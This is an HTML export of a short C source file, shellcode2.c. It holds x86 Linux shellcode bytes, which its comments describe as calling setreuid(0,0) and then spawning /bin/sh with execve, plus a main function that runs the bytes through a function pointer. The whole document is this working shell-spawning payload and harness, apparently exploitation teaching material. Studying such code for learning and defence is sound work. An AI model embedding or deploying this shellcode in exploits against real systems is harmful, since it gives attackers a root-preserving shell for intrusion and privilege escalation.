<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
<meta name="Generator" content="Kate, the KDE Advanced Text Editor" />
<title>shellcode2.c</title>
</head>
<!-- Highlighting: "C" -->
<body>
<pre style='font-weight:bold;color:#b2b2b2;background-color:#000000;'>
<b><span style='color:#54ff54;'>char</span></b> shellcode<b>[]</b> <b>=</b>                  <b><span style='color:#54ffff;'>// white space, such as carriage returns doesn't matter</span></b>
    <b><span style='color:#54ffff;'>// setruid(0,0)</span></b>
    <b><span style='color:#ff54ff;'>&quot;</span></b><b><span style='color:#ff5454;'>\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80</span></b><b><span style='color:#ff54ff;'>&quot;</span></b>
    
    <b><span style='color:#54ffff;'>// spawn shell with execve</span></b>
    <b><span style='color:#ff54ff;'>&quot;</span></b><b><span style='color:#ff5454;'>\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f</span></b><b><span style='color:#ff54ff;'>&quot;</span></b>
    <b><span style='color:#ff54ff;'>&quot;</span></b><b><span style='color:#ff5454;'>\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31</span></b><b><span style='color:#ff54ff;'>&quot;</span></b>
    <b><span style='color:#ff54ff;'>&quot;</span></b><b><span style='color:#ff5454;'>\xd2\xb0\x0b\xcd\x80</span></b><b><span style='color:#ff54ff;'>&quot;</span></b><b>;</b>
    
<b><span style='color:#54ff54;'>int</span></b> main<b>()</b>
<b>{</b>
    <b><span style='color:#54ff54;'>void</span></b> <b>(*</b>fp<b>)(</b><b><span style='color:#54ff54;'>void</span></b><b>);</b>               <b><span style='color:#54ffff;'>// declare a function pointer, fp</span></b>
    fp <b>=</b> <b>(</b><b><span style='color:#54ff54;'>void</span></b> <b>*)</b> shellcode<b>;</b>        <b><span style='color:#54ffff;'>// set the address of fp to our shellcode</span></b>
    fp<b>();</b>
<b>}</b>
</pre>
</body>
</html>
